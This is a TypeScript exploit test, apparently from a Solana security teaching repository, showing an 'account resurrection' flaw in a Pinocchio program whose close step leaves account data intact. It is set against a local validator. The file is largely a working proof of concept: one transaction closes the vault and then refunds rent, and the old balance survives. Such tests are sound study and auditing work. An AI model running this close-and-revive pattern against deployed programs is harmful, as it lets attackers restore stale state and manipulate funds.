/**
 * EXPLOIT TEST: Unsafe Account Closure (Pinocchio)
 * 
 * This test demonstrates the "Account Resurrection" vulnerability in Pinocchio.
 * 
 * Vulnerability: The program transfers lamports but leaves data intact.
 * Sending lamports back in the same transaction revives the account with old data.
 */

import {
    Connection,
    Keypair,
    PublicKey,
    Transaction,
    TransactionInstruction,
    LAMPORTS_PER_SOL,
    SystemProgram,
    sendAndConfirmTransaction,
} from "@solana/web3.js";

describe("05-unsafe-account-closure: Pinocchio Exploit", () => {
    const connection = new Connection("http://localhost:8899", "confirmed");
    const PROGRAM_ID = new PublicKey("CZqKx8VFNjKT4h8YqvLLN9vZ3qWKFQvXYrJJMWJWWNnL");

    const INITIALIZE_DISCRIMINATOR = 0;
    const DEPOSIT_DISCRIMINATOR = 1;
    const CLOSE_DISCRIMINATOR = 2; // Vulnerable close

    const BALANCE_OFFSET = 32;

    it("Resurrects closed account with intact data", async () => {
        console.log("\nüéØ EXPLOIT: Unsafe Account Closure (Pinocchio)\n");

        const user = Keypair.generate();
        console.log("üë§ User:", user.publicKey.toBase58());

        const airdropSig = await connection.requestAirdrop(
            user.publicKey,
            2 * LAMPORTS_PER_SOL
        );
        await connection.confirmTransaction(airdropSig);

        const [vaultPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("vault"), user.publicKey.toBuffer()],
            PROGRAM_ID
        );

        // Step 1: Initialize
        console.log("\nüìù Step 1: Initialize vault...");
        const initIx = new TransactionInstruction({
            keys: [
                { pubkey: user.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
            ],
            programId: PROGRAM_ID,
            data: Buffer.from([INITIALIZE_DISCRIMINATOR]),
        });
        await sendAndConfirmTransaction(connection, new Transaction().add(initIx), [user]);

        // Deposit to set some state
        const depositAmount = 0.5 * LAMPORTS_PER_SOL;
        const depositData = Buffer.alloc(9);
        depositData.writeUInt8(DEPOSIT_DISCRIMINATOR, 0);
        depositData.writeBigUInt64LE(BigInt(depositAmount), 1);
        const depositIx = new TransactionInstruction({
            keys: [
                { pubkey: user.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
            ],
            programId: PROGRAM_ID,
            data: depositData,
        });
        await sendAndConfirmTransaction(connection, new Transaction().add(depositIx), [user]);

        // Verify State
        let accountInfo = await connection.getAccountInfo(vaultPda);
        let balance = accountInfo.data.readBigUInt64LE(BALANCE_OFFSET);
        console.log(`‚úÖ Initial Balance: ${balance}`);

        // Step 2: Exploit - Close and Revive
        console.log("\nüö® Step 2: Exploit - Close and Revive in same transaction...");

        const closeIx = new TransactionInstruction({
            keys: [
                { pubkey: user.publicKey, isSigner: true, isWritable: true },
                { pubkey: vaultPda, isSigner: false, isWritable: true },
            ],
            programId: PROGRAM_ID,
            data: Buffer.from([CLOSE_DISCRIMINATOR]),
        });

        const refundIx = SystemProgram.transfer({
            fromPubkey: user.publicKey,
            toPubkey: vaultPda,
            lamports: await connection.getMinimumBalanceForRentExemption(40), // VAULT_SIZE
        });

        const tx = new Transaction().add(closeIx).add(refundIx);
        await sendAndConfirmTransaction(connection, tx, [user]);

        // Step 3: Verify Data Persistence
        accountInfo = await connection.getAccountInfo(vaultPda);
        console.log(`\nüí• EXPLOIT SUCCESSFUL!`);
        console.log(`Owner: ${accountInfo.owner.toBase58()} (Still Program Owned)`);

        const resurrectedBalance = accountInfo.data.readBigUInt64LE(BALANCE_OFFSET);
        console.log(`üíÄ Resurrected Balance: ${resurrectedBalance}`);

        if (resurrectedBalance === BigInt(depositAmount)) {
            console.log("‚úÖ Old data persisted perfectly. Vulnerability confirmed.");
        } else {
            throw new Error("Data was cleared?");
        }

    });
});
